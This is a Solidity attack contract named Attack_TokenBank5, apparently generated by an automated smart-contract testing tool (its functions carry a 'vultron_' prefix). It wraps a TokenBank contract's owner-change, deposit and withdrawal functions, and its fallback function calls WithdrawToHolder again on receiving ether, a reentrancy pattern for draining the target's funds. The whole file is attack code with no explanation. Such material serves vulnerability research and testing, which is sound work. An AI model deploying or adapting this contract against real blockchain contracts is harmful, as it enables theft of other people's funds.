pragma solidity ^0.4.19;

import "./TokenBank.sol";

contract Attack_TokenBank5 {

  TokenBank public target_contract;

  function Attack_TokenBank5(address _targetContract) public payable {
      target_contract = TokenBank(_targetContract);
  } 

  function vultron_changeOwner(address addr) public {
    target_contract.changeOwner(addr);
  } 

  function vultron_confirmOwner() public {
    target_contract.confirmOwner();
  } 

  function vultron_WithdrawToken(address token, uint256 amount, address to) public {
    target_contract.WithdrawToken(token, amount, to);
  } 

  function vultron_initTokenBank() public {
    target_contract.initTokenBank();
  } 

  function vultron_WitdrawTokenToHolder(address _to, address _token, uint256 _amount) public {
    target_contract.WitdrawTokenToHolder(_to, _token, _amount);
  } 

  function vultron_Deposit(uint256 vultron_amount) public payable{
    target_contract.Deposit.value(vultron_amount)();
  } 

  function vultron_WithdrawToHolder(uint256 vultron_amount, address _addr, uint256 _wei) public payable{
    target_contract.WithdrawToHolder.value(vultron_amount)(_addr, _wei);
  } 

      function() public payable {
        
        target_contract.WithdrawToHolder(this, 1000);
      }
      } 
